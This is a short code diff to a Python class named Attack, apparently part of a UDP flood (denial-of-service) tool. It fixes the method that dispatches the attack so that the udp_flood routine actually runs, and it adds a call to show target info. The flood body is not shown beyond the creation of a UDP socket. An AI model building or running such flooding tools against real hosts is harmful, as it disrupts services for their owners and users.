@@ -10,6 +10,7 @@ class Attack():
 
     def checkTargetAlive(self):
         print(self.target.isAlive())
+        self.target.displayShortInfo()
 
     def udp_flood(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -20,8 +21,8 @@ class Attack():
 
 
     def attack(self):
-        if self.type = 'udpflood':
-            udp_flood()
+        if self.type == 'udpflood':
+            self.udp_flood()
 
 
     
